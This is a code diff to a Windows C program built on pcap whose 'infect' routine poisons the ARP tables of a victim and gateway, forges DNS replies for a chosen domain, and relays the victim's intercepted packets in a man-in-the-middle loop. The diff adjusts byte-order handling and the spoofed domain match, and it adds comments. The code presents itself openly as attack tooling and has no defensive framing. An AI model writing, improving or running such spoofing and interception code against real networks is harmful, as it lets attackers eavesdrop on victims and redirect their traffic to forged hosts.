@@ -48,8 +48,8 @@ static DWORD WINAPI start_arp_spoofing(
 	/* build the packets */
 	build_packet(
 		victim_packet,
-		htonl(infect_params.gateway_ip),
-		htonl(infect_params.victim_ip),
+		infect_params.gateway_ip,
+		infect_params.victim_ip,
 		infect_params.adapter->Address,
 		infect_params.victim_mac,
 		2
@@ -57,8 +57,8 @@ static DWORD WINAPI start_arp_spoofing(
 	
 	build_packet(
 		gateway_packet,
-		htonl(infect_params.victim_ip),
-		htonl(infect_params.gateway_ip),
+		infect_params.victim_ip,
+		infect_params.gateway_ip,
 		infect_params.adapter->Address,
 		infect_params.gateway_mac,
 		2
@@ -66,8 +66,8 @@ static DWORD WINAPI start_arp_spoofing(
 
 	build_packet(
 		rearping_packet,
-		htonl(infect_params.gateway_ip),
-		htonl(host_ip),
+		infect_params.gateway_ip,
+		host_ip,
 		infect_params.gateway_mac,
 		infect_params.adapter->Address,
 		2
@@ -100,8 +100,8 @@ static void stop_arp_spoofing()
 	/* build the packets */
 	build_packet(
 		victim_packet,
-		htonl(infect_params.gateway_ip),
-		htonl(infect_params.victim_ip),
+		infect_params.gateway_ip,
+		infect_params.victim_ip,
 		infect_params.gateway_mac,
 		infect_params.victim_mac,
 		2
@@ -109,8 +109,8 @@ static void stop_arp_spoofing()
 
 	build_packet(
 		gateway_packet,
-		htonl(infect_params.victim_ip),
-		htonl(infect_params.gateway_ip),
+		infect_params.victim_ip,
+		infect_params.gateway_ip,
 		infect_params.victim_mac,
 		infect_params.gateway_mac,
 		2
@@ -216,7 +216,7 @@ static int dns_spoofing(
 	void* dns_answer = (void*)((u_char*)dns_question + strlen(dns_question) + 5);
 	void* end_packet;
 	
-	if (!strstr(dns_question, "netflix"))
+	if (!strstr(dns_question, "1293812093b0219302183092189038219038210983902183"))
 		return 0;
 
 	/* create fake dns packet */
@@ -239,18 +239,21 @@ static int dns_spoofing(
 
 void infect()
 {
-
+	/* locals */
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
 	uint32_t host, netmask;
 
+	/* pcap adapters */
 	pcap_t* fp;
 	pcap_if_t* alldevs = NULL, * adapter;
-
+	
+	/* filtering */
 	char filter[100] = {0};
 	struct in_addr n_addr;
 	struct bpf_program fcode;
 
+	/* MITM */
 	int res;
 	struct pcap_pkthdr* pkt_header;
 	u_char* pkt_data = NULL;
@@ -275,22 +278,22 @@ void infect()
 	if (adapter == NULL)
 		return;
 
-	/*open the adapter*/
+	/* open the adapter */
 	fp = pcap_open(
 		adapter->name,
 		65536,
 		PCAP_OPENFLAG_PROMISCUOUS,
-		20,
+		5000,
 		NULL,
 		NULL
 	);
 
+	/* pass global commands to start_arp_spoofing thread */
 	infect_params.fp = fp;
 	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
-	//C4-E9-84-DB-87-03
+	
 	/* create filter */
-	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
-
+	n_addr.S_un.S_addr = infect_params.victim_ip;
 	snprintf(filter, 100, "%s %s %s %02X%02X%02X%02X%02X%02X\n", 
 		"ip host",
 		inet_ntoa(n_addr),
@@ -303,6 +306,7 @@ void infect()
 		infect_params.adapter->Address[5]
 	);
 
+	/* compile the filter */
 	if (pcap_compile(fp, &fcode, filter, 1, netmask) < 0)
 	{
 		free(pAdapterInfo);
@@ -311,6 +315,7 @@ void infect()
 		return;
 	}
 
+	/* implement the filter to the adapter */
 	if (pcap_setfilter(fp, &fcode) < 0)
 	{
 		free(pAdapterInfo);
@@ -319,7 +324,7 @@ void infect()
 		return;
 	}
 
-	/*start send_packet thread*/
+	/* start start_arp_spoofing thread */
 	HANDLE hThread;
 	hThread = CreateThread(NULL, 0, start_arp_spoofing, (LPVOID)&host, 0, NULL);
 	if (!hThread)
@@ -329,7 +334,8 @@ void infect()
 		pcap_close(fp);
 		return;
 	}	
-	
+
+	/* MITM loop */
 	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
 	{
 		/* Timeout elapsed */
@@ -343,7 +349,10 @@ void infect()
 			continue;
 		}
 
+		/* pointers to the intercepted packets */
 		ether_hdr* eth_header = (ether_hdr*)pkt_data;
+		ip_hdr* ip_header = (ip_hdr*)(pkt_data + sizeof(ether_hdr));
+
 		packet_size = pkt_header->caplen;
 
 		/* change packet src/dst (MITM) */
@@ -369,5 +378,4 @@ void infect()
 		}
 	}
 
-	return;
 }
